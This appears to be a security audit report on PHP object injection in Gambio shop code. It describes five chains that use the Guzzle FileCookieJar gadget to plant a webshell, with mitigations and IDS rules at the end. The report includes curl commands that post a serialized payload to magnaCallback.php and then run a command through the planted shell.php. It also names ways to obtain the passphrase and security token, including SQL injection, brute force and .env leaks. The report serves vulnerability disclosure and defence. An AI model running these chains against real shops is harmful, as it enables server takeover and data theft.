# Exploitation Chains via FileCookieJar Gadget
## Multiple Attack Paths to RCE via PHP Object Injection

**Date:** 2025-12-24  
**Auditor:** GitHub Copilot  
**Focus:** All exploitation chains using FileCookieJar gadget  

---

## 1. EXPLOITATION CHAIN OVERVIEW

### Available Attack Vectors

| ID | Vector | Entry Point | Auth Required | Complexity |
|----|--------|-------------|---------------|------------|
| **CHAIN-1** | Direct POST | magnaCallback.php | Passphrase | Low |
| **CHAIN-2** | Cache Poisoning | API v2 cache files | Admin + File Write | Medium |
| **CHAIN-3** | Hub Cache Poisoning | HubCallback cache | Admin + File Write | Medium |
| **CHAIN-4** | Janolaw Cache | janolaw-versioninfo.pdc | File Write | Low |
| **CHAIN-5** | DataCache Poisoning | Persistent cache files | File Write | Medium |

---

## 2. CHAIN-1: Direct POST to magnaCallback.php (MOST EXPLOITABLE)

### Flow Diagram

```
┌───────────────────────────────────────────────────────────────┐
│                        ATTACKER                               │
└───────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────────┐
│ POST /magnaCallback.php                                        │
│ passphrase=<LEAKED>&function=test&arguments=<SERIALIZED>       │
└───────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────────┐
│ magnaCallback.php Line 855-862                                 │
│                                                               │
│ if (($_POST['passphrase'] == getDBConfigValue('general.pass'))│
│     && array_key_exists('function', $_POST)) {                 │
│                                                               │
│     $arguments = unserialize($_POST['arguments']); // VULN!   │
│     $includes = unserialize($_POST['includes']);   // VULN!   │
│ }                                                              │
└───────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────────┐
│ FileCookieJar::__destruct()                                    │
│     └── file_put_contents('/var/www/html/shell.php', payload)  │
└───────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────────┐
│ WEBSHELL WRITTEN → RCE                                         │
└───────────────────────────────────────────────────────────────┘
```

### Exploit Code

```bash
# Step 1: Generate payload
PAYLOAD=$(php -r '
namespace GuzzleHttp\Cookie;
// [Payload generation code - see previous report]
echo urlencode(serialize($jar));
')

# Step 2: Send exploit
curl -X POST "https://target.com/magnaCallback.php" \
  -d "passphrase=LEAKED_PASSPHRASE" \
  -d "function=test" \
  -d "arguments=$PAYLOAD"

# Step 3: Access shell
curl "https://target.com/cache/shell.php?c=id"
```

### Requirements

| Requirement | How to Obtain |
|-------------|---------------|
| Passphrase | SQL injection, default value, config leak, brute-force |
| Magnalister | Must be installed |
| Write Access | cache/ directory (usually writable) |

---

## 3. CHAIN-2: API v2 Cache Poisoning

### Vulnerable Code

**File:** `GXMainComponents/Controllers/Api/AbstractApiV2Controller.inc.php`  
**Lines:** 181-221

```php
protected function _setRateLimitHeader()
{
    // Load cache file - NO allowed_classes!
    $cacheFilePath = DIR_FS_CATALOG . 'cache/gxapi_v2_sessions_' . FileLog::get_secure_token();
    if (!file_exists($cacheFilePath)) {
        touch($cacheFilePath);
        $sessions = [];
    } else {
        $sessions = unserialize(file_get_contents($cacheFilePath));  // VULN!
    }
    
    // ... later ...
    file_put_contents($cacheFilePath, serialize($sessions));
}
```

**Also in:** `api.php` Lines 221-261 (same code pattern)

### Attack Vector

```
┌───────────────────────────────────────────────────────────────┐
│ Step 1: Obtain file write primitive                           │
│         (File upload vuln, path traversal, LFI to write)      │
└───────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────────┐
│ Step 2: Discover cache filename                               │
│         gxapi_v2_sessions_<SECURE_TOKEN>                      │
│         Token = env('APP_SECURITY_TOKEN')                     │
└───────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────────┐
│ Step 3: Overwrite cache file with serialized FileCookieJar   │
│         cache/gxapi_v2_sessions_<TOKEN>                       │
└───────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────────┐
│ Step 4: Trigger API call to load poisoned cache               │
│         GET /api.php/v2/customers                              │
└───────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────────┐
│ unserialize(file_get_contents($cacheFilePath))                │
│     └── FileCookieJar::__destruct() → RCE                      │
└───────────────────────────────────────────────────────────────┘
```

### Requirements

| Requirement | Difficulty |
|-------------|------------|
| File write to cache/ | Requires prior vulnerability |
| Know secure token | Leak via info disclosure or file read |
| API enabled | Default in modern Gambio |

### Token Discovery

The secure token is stored in environment:
```php
// FileLog.php Line 99
return Gambio\Core\Application\env('APP_SECURITY_TOKEN');
```

Potential sources:
- `.env` file disclosure
- phpinfo() exposure
- Error messages with stack traces
- Log file disclosure

---

## 4. CHAIN-3: Gambio Hub Cache Poisoning

### Vulnerable Code

**File:** `GXModules/Gambio/Hub/Shop/Classes/Extensions/HubCallback.inc.php`  
**Lines:** 1181-1214

```php
private function _getCacheValue($key)
{
    $cacheFilePath = $this->_getCacheFilePath($key);
    if(file_exists($cacheFilePath))
    {
        $value = unserialize(file_get_contents($cacheFilePath));  // VULN!
    }
    // ...
}

private function _setCacheValue($key, $value, DateTime $expires = null)
{
    $cacheFilePath = $this->_getCacheFilePath($key);
    // ...
    file_put_contents($cacheFilePath, serialize($value));
}
```

### Cache File Location

```php
private function _getCacheFilePath($key)
{
    return DIR_FS_CATALOG . 'cache/hub_' . md5($key) . '.cache';
}
```

### Attack Vector

1. Obtain file write to `cache/` directory
2. Create file `cache/hub_<MD5_HASH>.cache` with serialized payload
3. Trigger HubCallback that reads the cache key
4. RCE via FileCookieJar

---

## 5. CHAIN-4: Janolaw Cache Poisoning

### Vulnerable Code

**File:** `gm/classes/GMJanolaw.php`  
**Lines:** 298-330

```php
public function getVersionInfo()
{
    $cache_file = DIR_FS_CATALOG.'cache/janolaw-versioninfo.pdc';
    
    // ... version check code ...
    
    file_put_contents($cache_file, serialize($version_info));
    
    // Later read without allowed_classes:
    $version_info = unserialize(file_get_contents($cache_file));  // VULN!
    
    return $version_info;
}
```

### Cache File Location

**Fixed path:** `cache/janolaw-versioninfo.pdc`

### Attack Vector

```
┌───────────────────────────────────────────────────────────────┐
│ Step 1: Obtain file write to cache/janolaw-versioninfo.pdc    │
│         (No token needed - fixed filename!)                    │
└───────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────────┐
│ Step 2: Write serialized FileCookieJar to cache file          │
└───────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────────┐
│ Step 3: Visit Janolaw admin page or trigger version check     │
│         (JanolawModuleCenterModuleController)                  │
└───────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────────┐
│ unserialize(file_get_contents($cache_file)) → RCE             │
└───────────────────────────────────────────────────────────────┘
```

### Advantage

**No token required!** The cache filename is fixed: `janolaw-versioninfo.pdc`

---

## 6. CHAIN-5: DataCache Poisoning

### Vulnerable Code

**File:** `system/core/caching/DataCache.inc.php`  
**Lines:** 87-91, 319-326

```php
// Reading cache
$coo_cached_data = unserialize($t_data_serialized);  // VULN!

// Persistent cache
$cachedData = self::$persistentDataCache[$cacheFileName] = 
    unserialize(file_get_contents($cacheFilePath));  // VULN!
```

### Cache Locations

```php
// Cache directory
$this->get_cache_dir() // Returns cache/ directory

// Files follow pattern:
// persistent_data_cache-<NAME>
```

### Attack Vector

Similar to other chains - requires file write to cache/ directory.

---

## 7. COMBINED ATTACK: LFI + Cache Poisoning

### Prerequisites

Use identified LFI vulnerabilities to write to cache files:

1. **swixpostfinancecheckout/callback.php LFI** (Part 1)
2. **Cloudloader session-based LFI** (Part 1)
3. **FileManager path traversal** (Part 4)

### Attack Flow

```
┌───────────────────────────────────────────────────────────────┐
│ Step 1: Use LFI/Path Traversal to write serialized payload    │
│         Target: cache/janolaw-versioninfo.pdc (no token!)     │
└───────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────────┐
│ Step 2: Trigger Janolaw version check                         │
│         Admin → Module Center → Janolaw                        │
│         OR automated cronjob                                   │
└───────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────────┐
│ Step 3: unserialize() triggers FileCookieJar::__destruct()    │
│         → Webshell written                                     │
└───────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌───────────────────────────────────────────────────────────────┐
│ Step 4: Access webshell → Full RCE                             │
└───────────────────────────────────────────────────────────────┘
```

---

## 8. RISK ASSESSMENT

### Chain Comparison

| Chain | Complexity | Auth Required | Direct Exploit |
|-------|------------|---------------|----------------|
| CHAIN-1 (magnaCallback) | **LOW** | Passphrase | **YES** |
| CHAIN-2 (API v2 Cache) | High | File Write + Token | No |
| CHAIN-3 (Hub Cache) | High | File Write | No |
| CHAIN-4 (Janolaw Cache) | **MEDIUM** | File Write Only | No |
| CHAIN-5 (DataCache) | High | File Write | No |

### Most Dangerous: CHAIN-1

**Direct exploitation via magnaCallback.php** is the most critical because:
1. Single HTTP request
2. No chained vulnerabilities required
3. Only requires passphrase (often weak/default)

### Second Most Dangerous: CHAIN-4

**Janolaw cache poisoning** is dangerous because:
1. Fixed filename (no token to guess)
2. Combined with file upload = easy RCE
3. Triggered by admin actions (social engineering possible)

---

## 9. MITIGATION

### For All Chains

```php
// Always use allowed_classes parameter
$data = unserialize($serialized, ['allowed_classes' => false]);

// Or use JSON instead
$data = json_decode($serialized, true);
```

### Specific Fixes

**magnaCallback.php:**
```php
// Line 859-862 - Replace:
$arguments = json_decode($_POST['arguments'] ?? '[]', true);
$includes = json_decode($_POST['includes'] ?? '[]', true);
```

**API v2 Cache:**
```php
// AbstractApiV2Controller.inc.php Line 186
$sessions = unserialize(
    file_get_contents($cacheFilePath), 
    ['allowed_classes' => false]
);
```

**Janolaw:**
```php
// GMJanolaw.php Line 329
$version_info = unserialize(
    file_get_contents($cache_file),
    ['allowed_classes' => ['stdClass']]  // Only allow stdClass
);
```

---

## 10. DETECTION

### IDS Signatures

```
# Detect FileCookieJar in serialized data
alert http any any -> any any (
    content:"GuzzleHttp|5c|Cookie|5c|FileCookieJar";
    msg:"PHP Object Injection - FileCookieJar Gadget";
    sid:1000001;
)

# Detect suspicious cache file writes
alert tcp any any -> any any (
    content:"file_put_contents";
    content:".pdc";
    msg:"Suspicious cache file write";
    sid:1000002;
)
```

### Log Monitoring

```bash
# Monitor magnaCallback.php access
grep "magnaCallback.php" /var/log/apache2/access.log | grep POST

# Monitor cache directory writes
inotifywait -m /var/www/html/cache/ -e create -e modify
```

---

## 11. REFERENCES

- OWASP PHP Object Injection: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
- PHPGGC Project: https://github.com/ambionics/phpggc
- Guzzle FileCookieJar Gadget: https://github.com/ambionics/phpggc/blob/master/gadgetchains/Guzzle/FW/1/

---

*This report is for authorized security testing purposes only.*
